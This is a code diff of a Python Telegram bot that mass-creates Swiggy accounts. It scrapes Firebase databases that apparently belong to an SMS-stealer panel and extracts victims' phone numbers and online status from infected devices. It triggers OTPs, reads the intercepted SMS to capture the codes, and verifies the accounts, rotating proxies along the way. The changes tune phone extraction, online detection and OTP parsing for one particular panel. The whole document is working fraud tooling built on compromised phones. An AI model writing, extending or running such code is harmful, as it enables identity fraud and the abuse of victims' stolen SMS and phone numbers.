@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-# Swiggy Firebase Account Creator — Telegram Bot
+# Swiggy Firebase Account Creator — Telegram Bot (fixed for this panel structure)
 # Firebase URL → online devices → Swiggy OTP → watch SMS → verify → JSON dump
-# Render free web service ready
 
 import os, re, sys, json, time, uuid, random, string, base64, secrets, asyncio, logging, threading, subprocess, urllib.request
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional, Tuple
 from pathlib import Path
+from collections import Counter
 
 import aiohttp
 from aiohttp import web
@@ -148,12 +148,8 @@ async def refresh_proxies() -> int:
             await PROXY.mark_bad(p)
     return good
 
-# ─── Firebase helpers ───
-SMS_PATHS = [
-    "messages", "sms", "inbox", "Sms", "SMS", "receivedSms", "smsList",
-    "All_Users/sms", "user_sms",
-]
-ONLINE_TRUE = {"true", "1", "online", "connected", "active", "yes"}
+# ─── Firebase helpers (fixed for this panel) ───
+SMS_PATHS = ["messages", "sms", "inbox", "Sms", "SMS", "receivedSms", "smsList", "All_Users/sms", "user_sms"]
 
 def clean_phone(raw) -> Optional[str]:
     if not raw:
@@ -167,41 +163,59 @@ def clean_phone(raw) -> Optional[str]:
         return d
     return None
 
+def deep_phones(obj, depth=0) -> List[str]:
+    """Recursively collect all 10-digit Indian mobiles from any nested structure."""
+    found = []
+    if depth > 8:
+        return found
+    if isinstance(obj, dict):
+        for v in obj.values():
+            found.extend(deep_phones(v, depth + 1))
+    elif isinstance(obj, list):
+        for v in obj:
+            found.extend(deep_phones(v, depth + 1))
+    elif isinstance(obj, (str, int)):
+        p = clean_phone(obj)
+        if p:
+            found.append(p)
+    return found
+
 def is_online(dev: dict) -> bool:
-    for f in ("status", "online", "isOnline", "connected", "active"):
+    # this panel uses boolean status + ping.wake
+    st = dev.get("status")
+    if isinstance(st, bool) and st:
+        return True
+    if str(st).lower().strip() in ("true", "1", "online", "connected", "active", "yes"):
+        return True
+    ping = dev.get("ping")
+    if isinstance(ping, dict) and ping.get("wake"):
+        return True
+    for f in ("online", "isOnline", "connected", "active"):
         v = dev.get(f)
-        if v is None:
-            continue
-        if isinstance(v, bool):
-            return v
-        if isinstance(v, int):
-            return v == 1
-        if str(v).lower().strip() in ONLINE_TRUE:
+        if isinstance(v, bool) and v:
+            return True
+        if str(v).lower().strip() in ("true", "1", "online"):
             return True
     return False
 
-def phone_from_dev(dev: dict) -> Optional[str]:
-    sims = dev.get("sims") or []
-    if isinstance(sims, dict):
-        sims = list(sims.values())
-    if isinstance(sims, list):
-        for sim in sims[:2]:
-            if isinstance(sim, dict):
-                for k in ("phoneNumber", "phone", "number", "mobNo", "mob"):
-                    p = clean_phone(sim.get(k))
-                    if p:
-                        return p
-    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile",
-              "sim1Number", "sim2Number", "numberSim1", "numberSim2"):
-        p = clean_phone(dev.get(k))
-        if p:
-            return p
-    return None
+def best_phone(dev: dict) -> Optional[str]:
+    """Pick the most likely device phone (highest frequency in the object)."""
+    phones = deep_phones(dev)
+    if not phones:
+        return None
+    # prefer numbers that appear as mobNo / mobile fields (device identity)
+    counts = Counter(phones)
+    # slight boost if appears under typical identity keys
+    text = json.dumps(dev)
+    for p, c in list(counts.items()):
+        if f'"mobNo": "{p}"' in text or f'"mobile": "{p}"' in text or f'"num": "{p}"' in text:
+            counts[p] += 20
+    return counts.most_common(1)[0][0]
 
 async def fb_get(session: aiohttp.ClientSession, url: str, path: str = "") -> Optional[dict]:
     try:
         full = f"{url}{path}.json" if path else f"{url}.json"
-        async with session.get(full, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as r:
+        async with session.get(full, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as r:
             if r.status != 200:
                 return None
             data = await r.json(content_type=None)
@@ -212,63 +226,67 @@ async def fb_get(session: aiohttp.ClientSession, url: str, path: str = "") -> Op
 async def load_firebase_devices(fb_url: str) -> List[Dict]:
     if not fb_url.endswith("/"):
         fb_url += "/"
-    ROOTS = ["clients", "devices", "users", "Clients", "Devices", "All_Users", "user_data"]
     devices = []
     seen = set()
 
     async with aiohttp.ClientSession() as http:
-        for key in ROOTS:
+        # Primary: /clients (this panel)
+        clients = await fb_get(http, fb_url, "clients")
+        if clients:
+            for cid, dev in clients.items():
+                if not isinstance(dev, dict):
+                    continue
+                phone = best_phone(dev)
+                if not phone or phone in seen:
+                    continue
+                seen.add(phone)
+                devices.append({
+                    "client_id": cid,
+                    "phone": phone,
+                    "online": is_online(dev),
+                    "battery": dev.get("battery"),
+                    "raw": dev,
+                })
+
+        # Fallback roots
+        for key in ("devices", "users", "registeredDevices", "user_data", "All_Users"):
             data = await fb_get(http, fb_url, key)
-            if not data:
+            if not data or not isinstance(data, dict):
                 continue
             for cid, dev in data.items():
                 if not isinstance(dev, dict):
                     continue
-                if key == "All_Users":
-                    continue
-                phone = phone_from_dev(dev)
+                phone = best_phone(dev)
                 if not phone or phone in seen:
                     continue
-                online = is_online(dev)
                 seen.add(phone)
-                devices.append({"client_id": cid, "phone": phone, "online": online, "raw": dev})
+                devices.append({
+                    "client_id": cid,
+                    "phone": phone,
+                    "online": is_online(dev),
+                    "battery": dev.get("battery"),
+                    "raw": dev,
+                })
 
+        # All_Users/simDetails pattern
         sim = await fb_get(http, fb_url, "All_Users/simDetails")
         info = await fb_get(http, fb_url, "All_Users/Data/DeviceInfo") or {}
         if sim:
             for cid, s in sim.items():
                 if not isinstance(s, dict):
                     continue
-                phone = None
-                for f in ("sim1Number", "sim2Number"):
-                    phone = clean_phone(s.get(f))
-                    if phone:
-                        break
+                phone = best_phone(s) or clean_phone(s.get("sim1Number")) or clean_phone(s.get("sim2Number"))
                 if not phone or phone in seen:
                     continue
                 di = info.get(cid) or {}
-                online = is_online(di) or is_online(s)
                 seen.add(phone)
-                devices.append({"client_id": cid, "phone": phone, "online": online, "raw": di})
-
-        if not devices:
-            root = await fb_get(http, fb_url, "")
-            if root:
-                for key in list(root.keys())[:40]:
-                    data = await fb_get(http, fb_url, key)
-                    if not isinstance(data, dict):
-                        continue
-                    for cid, dev in data.items():
-                        if not isinstance(dev, dict):
-                            continue
-                        phone = phone_from_dev(dev)
-                        if not phone or phone in seen:
-                            continue
-                        seen.add(phone)
-                        devices.append({
-                            "client_id": cid, "phone": phone,
-                            "online": is_online(dev), "raw": dev
-                        })
+                devices.append({
+                    "client_id": cid,
+                    "phone": phone,
+                    "online": is_online(di) or is_online(s),
+                    "battery": di.get("Battery") or di.get("battery"),
+                    "raw": di,
+                })
 
     devices.sort(key=lambda x: (0 if x["online"] else 1))
     return devices
@@ -284,7 +302,7 @@ def extract_otp(body: str) -> Optional[str]:
         if 1900 <= n <= 2099:
             continue
         scores[c] = scores.get(c, 0) + 1
-        for kw in ("otp", "code", "verify", "verification", "pin", "one time", "passcode"):
+        for kw in ("otp", "code", "verify", "verification", "pin", "one time", "passcode", "authentication"):
             if kw in body_l:
                 scores[c] += 5
                 break
@@ -298,18 +316,17 @@ def extract_otp(body: str) -> Optional[str]:
 
 async def get_last_sms_key(http: aiohttp.ClientSession, fb_url: str, device_id: str) -> Tuple[Optional[str], Optional[str]]:
     latest, active = None, None
-    for sub in SMS_PATHS:
+    # this panel uses /messages first
+    for sub in ["messages"] + [p for p in SMS_PATHS if p != "messages"]:
         try:
-            data = await fb_get(http, fb_url, f"{sub}/{device_id}")
-            if not data:
-                url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1'
-                async with http.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
-                    if r.status != 200:
-                        continue
-                    data = await r.json(content_type=None)
+            url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1'
+            async with http.get(url, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
+                if r.status != 200:
+                    continue
+                data = await r.json(content_type=None)
             if isinstance(data, dict) and data:
                 key = sorted(data.keys())[-1]
-                if latest is None or key > latest:
+                if latest is None or str(key) > str(latest):
                     latest, active = key, sub
         except Exception:
             continue
@@ -318,26 +335,26 @@ async def get_last_sms_key(http: aiohttp.ClientSession, fb_url: str, device_id: 
 async def wait_otp(fb_url: str, device_id: str, last_key: Optional[str],
                    active: Optional[str], timeout: int = OTP_TIMEOUT) -> Optional[str]:
     deadline = time.time() + timeout
-    paths = [active] + [p for p in SMS_PATHS if p != active] if active else SMS_PATHS
+    paths = [active] + [p for p in (["messages"] + SMS_PATHS) if p != active] if active else (["messages"] + SMS_PATHS)
     async with aiohttp.ClientSession() as http:
         while time.time() < deadline:
             for sub in paths:
                 try:
-                    url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=15'
-                    async with http.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
+                    url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=20'
+                    async with http.get(url, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
                         if r.status != 200:
                             continue
                         msgs = await r.json(content_type=None)
                     if not isinstance(msgs, dict):
                         continue
                     for key in sorted(msgs.keys(), reverse=True):
-                        if last_key and key <= last_key:
+                        if last_key and str(key) <= str(last_key):
                             break
                         msg = msgs[key]
                         body = ""
                         if isinstance(msg, dict):
                             body = str(
-                                msg.get("body") or msg.get("message") or msg.get("text") or
+                                msg.get("message") or msg.get("body") or msg.get("text") or
                                 msg.get("content") or
                                 " ".join(str(v) for v in msg.values() if isinstance(v, str))
                             )
@@ -583,7 +600,6 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await cmd_stop(update, context)
         return
 
-    # multi-line proxy paste
     if ":" in text and not text.startswith("http") and len(text.splitlines()) > 1:
         PROXIES_FILE.write_text(text, encoding="utf-8")
         PROXY.load_file(PROXIES_FILE)
@@ -620,11 +636,14 @@ async def run_job(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: List
                 break
             if not fb.endswith("/"):
                 fb += "/"
-            await progress(f"🔥 Scanning {fb[:60]}...")
+            await progress(f"🔥 Scanning {fb[:70]}...")
             devices = await load_firebase_devices(fb)
             online = [d for d in devices if d["online"]]
             pool = online if online else devices
-            await progress(f"Found {len(devices)} devices · online {len(online)} · using {len(pool)}")
+            await progress(
+                f"Found {len(devices)} devices · online {len(online)} · using {len(pool)}\n"
+                + "\n".join(f"{'🟢' if d['online'] else '🔴'} {d['phone']} · {d['client_id'][:10]}… · bat={d.get('battery')}" for d in pool[:12])
+            )
 
             sem = asyncio.Semaphore(MAX_WORKERS)
 
@@ -709,7 +728,6 @@ def main():
         await site.start()
         log.info("listening on :%s", PORT)
 
-        # keep alive forever
         while True:
             await asyncio.sleep(3600)
 
